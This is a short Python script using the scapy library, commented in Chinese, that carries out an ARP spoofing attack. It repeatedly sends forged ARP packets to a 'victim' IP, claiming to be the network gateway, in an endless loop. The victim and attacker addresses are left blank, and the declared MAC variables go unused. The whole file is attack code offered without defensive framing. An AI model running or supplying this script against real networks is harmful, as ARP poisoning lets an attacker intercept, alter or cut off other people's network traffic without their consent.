# -*- encoding: UTF-8 -*-
import time
from scapy.all import *

def main():
    gatewayIP = ''      #网关
    victimIP = ''       #受害者ip
    victimMAC = ''      #受害者MAC地址
    hackMAC = ''        #攻击者MAC地址

    packet = Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())

    pass

if __name__ == '__main__':
    main()
